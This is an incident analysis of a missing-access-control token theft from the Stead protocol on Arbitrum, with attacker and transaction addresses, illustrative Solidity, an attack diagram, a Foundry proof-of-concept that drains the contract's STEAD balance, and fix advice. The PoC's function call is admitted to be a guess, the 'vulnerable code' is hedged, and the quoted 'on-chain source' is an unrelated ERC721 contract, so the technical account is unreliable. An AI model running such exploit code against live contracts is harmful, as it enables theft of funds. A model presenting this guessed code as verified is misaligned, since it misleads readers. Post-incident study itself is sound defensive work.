# Stead — Token Theft via Missing Access Control Analysis

| Field | Details |
|------|------|
| **Date** | 2025-06-27 |
| **Protocol** | Stead |
| **Chain** | Arbitrum |
| **Loss** | ~14,500 USD |
| **Attacker** | [0x5fb0b8584b34e56e386941a65dbe455ad43c5a23](https://arbiscan.io/address/0x5fb0b8584b34e56e386941a65dbe455ad43c5a23) |
| **Attack Tx** | [0x32dbfce2](https://arbiscan.io/tx/0x32dbfce2253002498cd41a2d79e249250f92673bc3de652f3919591ee26e8001) |
| **Vulnerable Contract** | [0xf9FF933f51bA180a474634440a406c95DfB27596](https://arbiscan.io/address/0xf9FF933f51bA180a474634440a406c95DfB27596) |
| **Root Cause** | Sensitive functions in the contract callable by arbitrary addresses with no access control |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-06/Stead_exp.sol) |

---

## 1. Vulnerability Overview

The vulnerable contract (0xf9FF...) in the Stead protocol lacked `onlyOwner` or equivalent access control on functions capable of moving STEAD tokens. An external attacker directly called the affected function and transferred the entire balance of STEAD tokens held by the contract to their own address.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable logic: asset transfer function with no access control
contract Contractf9ff {
    IERC20 steady = IERC20(STEAD);

    // Callable by anyone — no onlyOwner
    function withdrawTokens(address to, uint256 amount) external {
        // No msg.sender validation
        steady.transfer(to, amount);
    }

    // Or an arbitrary-call function
    function execute(address target, bytes calldata data) external {
        // No access control — attacker can call STEAD.transfer
        (bool success,) = target.call(data);
        require(success);
    }
}

// ✅ Fix: add access control
contract Contractf9ff {
    address public owner;

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    function withdrawTokens(address to, uint256 amount) external onlyOwner {
        steady.transfer(to, amount);
    }
}
```

### On-Chain Source Code

Source: Sourcify verified

```solidity
// File: contracts/NFT/ERC721V2.sol
// SPDX-License-Identifier: BSD-3-Clause
pragma solidity ^0.8.20;

import {ERC721V1} from "./ERC721V1.sol";
import {BurnRegistryV1} from "./burnRegistry/BurnRegistryV1.sol";

contract ERC721V2 is ERC721V1 {
  address payable internal _burnRegistry;

  event ERC721V2BurnRegistryChanged();

  error ERC721V2InvalidBurnRegistry();

  constructor() {
    _disableInitializers();
  }

  function migrateToV2(address payable __burnRegistry) public {
    if (_burnRegistry != address(0)) revert ERC721V2InvalidBurnRegistry();

    _burnRegistry = __burnRegistry;
  }

  function burnRegistry() public view returns (address) {
    return _burnRegistry;
  }

  function changeBurnRegistry(address payable __burnRegistry) public onlyOwner {
    if (__burnRegistry == address(0)) revert ERC721V2InvalidBurnRegistry();

    _burnRegistry = __burnRegistry;

    emit ERC721V2BurnRegistryChanged();
  }

  function burn(uint256 tokenId) public nonReentrant {
    address sender = _msgSender();
    if (ownerOf(tokenId) != sender) revert ERC721V1TransferForbidden();

    _burn(tokenId);
    BurnRegistryV1(_burnRegistry).burn(sender, tokenId);
  }
}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─1─▶ Analyze vulnerable contract (0xf9FF...)
  │         └─ Discover asset transfer function with no access control
  │
  ├─2─▶ Directly call vulnerable function
  │         └─ to=attacker, amount=entire STEAD balance
  │
  └─3─▶ Drain ~14,500 USD worth of STEAD tokens
```

## 4. PoC Code (Core Logic + Comments)

```solidity
contract Contractf9ff is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 352509408 - 1;

    function setUp() public {
        vm.createSelectFork("arbitrum", blocknumToForkFrom);
        fundingToken = STEAD; // Track STEAD balance
    }

    function testExploit() public balanceLog {
        // Check STEAD balance held by the vulnerable contract
        uint256 victimBalance = IERC20(STEAD).balanceOf(VICTIM);

        // Directly call the unprotected function — transfer to attacker address
        // Exact call signature depends on the actual vulnerable function name
        (bool success,) = VICTIM.call(
            abi.encodeWithSignature("withdrawTokens(address,uint256)", address(this), victimBalance)
        );
        require(success, "Exploit failed");
        // Result: attacker holds the entire STEAD balance
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Missing Access Control |
| **Attack Vector** | Direct call to unauthorized function |
| **Impact Scope** | Entire STEAD token balance held by the contract |
| **CWE** | CWE-284 (Improper Access Control) |
| **DASP** | Access Control |

## 6. Remediation Recommendations

1. **onlyOwner or Role-Based Access Control**: Apply appropriate modifiers to all asset transfer functions
2. **Use OpenZeppelin AccessControl**: Leverage the standard library for role-based permission management
3. **Minimize Function Visibility**: Declare functions that do not require external calls as `internal` or `private`
4. **Mandatory Audits**: Conduct professional audits prior to deployment and review access control checklists

## 7. Lessons Learned

- Missing access control is one of the most fundamental yet critical vulnerability types in DeFi attacks.
- Every function in a smart contract that moves assets should be restricted by default; public access must be explicitly permitted only when necessary.
- Regardless of contract size or asset volume, a basic access control review is essential before deployment.